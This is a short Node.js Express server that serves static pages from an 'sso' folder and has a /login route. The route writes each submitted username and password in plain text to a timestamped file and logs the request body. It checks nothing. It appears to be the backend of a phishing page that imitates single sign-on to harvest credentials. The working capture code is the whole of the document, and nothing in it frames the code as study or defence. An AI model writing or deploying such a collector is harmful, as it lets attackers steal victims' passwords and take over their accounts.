const express = require("express");
const app = express();

const fs = require("fs");

app.use(express.static("sso"));
app.use(express.json());

app.post("/login", (req, res) => {
    console.log(req.body);
    fs.writeFile(__dirname + "/data/credentials_" + Date.now() + ".json", "Username: " + req.body.user + "\nPassword: " + req.body.pass, (err) => {
        if (err) {
            console.error(err);
            res.json({ err: "Error writing file" });
            return;
        } else {
            console.log("Password saved");
            res.json({ ok: true });
        }
    })
})

app.listen(3000, console.log("Server listening on port 3000"));